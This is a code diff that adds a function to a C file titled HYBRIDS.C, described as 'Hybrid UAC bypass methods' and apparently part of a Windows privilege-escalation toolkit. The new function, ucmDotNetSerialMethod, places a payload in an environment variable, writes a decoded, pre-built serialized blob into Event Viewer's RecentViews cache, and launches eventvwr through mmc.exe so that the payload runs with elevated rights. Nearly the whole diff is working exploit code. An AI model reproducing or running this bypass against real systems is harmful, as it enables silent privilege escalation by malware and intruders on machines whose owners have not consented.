@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.59
+*  VERSION:     3.60
 *
-*  DATE:        02 Feb 2022
+*  DATE:        27 Apr 2022
 *
 *  Hybrid UAC bypass methods.
 *
@@ -1135,6 +1135,89 @@ NTSTATUS ucmMsdtMethod(
 #ifdef _DEBUG
     supSetGlobalCompletionEvent();
 #endif
+
+    return MethodResult;
+}
+
+/*
+* ucmDotNetSerialMethod
+*
+* Purpose:
+*
+* Bypass UAC using DotNet Deserialization for eventvwr.
+*
+*/
+NTSTATUS ucmDotNetSerialMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HANDLE hProcess = NULL;
+    PVOID dataBuffer;
+    DWORD dataSize;
+    LPWSTR lpAppData = NULL, lpTargetPath = NULL;
+    SIZE_T memIO;
+    WCHAR szTarget[MAX_PATH * 2];
+
+    do {
+
+        //
+        // Set payload as environment variable.
+        //
+        supSetEnvVariable(FALSE, NULL, MYSTERIOUSCUTETHING, lpszPayload);
+
+        //
+        // Drop RecentViews cache element to %AppData%.
+        //
+        if (FAILED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &lpAppData)))
+            break;
+
+        memIO = (MAX_PATH + _strlen(lpAppData)) * sizeof(WCHAR);
+        lpTargetPath = (LPWSTR)supHeapAlloc(memIO);
+        if (lpTargetPath == NULL)
+            break;
+
+        _strcpy(lpTargetPath, lpAppData);
+        _strcat(lpTargetPath, TEXT("\\Microsoft\\Event Viewer\\RecentViews"));
+
+        if (g_ctx->dwBuildNumber < NT_WIN8_RTM) {
+            dataBuffer = (PVOID)g_encodedRecentViewsV2;
+            dataSize = sizeof(g_encodedRecentViewsV2);
+        }
+        else {
+            dataBuffer = (PVOID)g_encodedRecentViews;
+            dataSize = sizeof(g_encodedRecentViews);
+        }
+
+        if (!supDecodeAndWriteBufferToFile(lpTargetPath,
+            (CONST PVOID)dataBuffer,
+            dataSize,
+            'zzzz'))
+        {
+            break;
+        }
+
+        //
+        // Run eventvwr.exe as final trigger.
+        //
+        _strcpy(szTarget, g_ctx->szSystemDirectory);
+        _strcat(szTarget, MMC_EXE);
+        hProcess = supRunProcess3(szTarget, EVENTVWR_MSC, NULL, SW_SHOW);
+        if (hProcess) {
+            supWaitForChildProcesses(MMC_EXE, 50 * 1000);
+            CloseHandle(hProcess);
+            MethodResult = STATUS_SUCCESS;
+        }
+
+    } while (FALSE);
+
+    if (lpAppData) CoTaskMemFree(lpAppData);
+    if (lpTargetPath) {
+        DeleteFile(lpTargetPath);
+        supHeapFree(lpTargetPath);
+    }
+
+    supSetEnvVariable(TRUE, NULL, MYSTERIOUSCUTETHING, NULL);
 
     return MethodResult;
 }
